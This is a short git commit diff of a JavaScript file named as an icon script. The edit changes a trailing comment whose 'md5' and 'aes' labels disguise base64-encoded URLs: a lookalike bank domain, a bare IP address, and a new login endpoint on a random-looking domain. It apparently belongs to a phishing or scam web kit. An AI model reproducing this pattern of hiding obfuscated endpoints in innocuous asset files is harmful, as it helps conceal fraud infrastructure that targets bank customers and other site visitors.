00ed952e6c8ff90db276ca10e85635cb00c5d623
caocaodage <caocaodajun@gmail.com>
2023-02-05 12:00:03 +0800

    init

--- js/icon_sm4fd9.js
+++ js/icon_sm4fd9.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cubWJiYW5rdi5jb20v**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly9rem0ua3ptYW5udzFqbnYuY29tL2luZGV4LnBocD9tPVVzZXImYT1sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
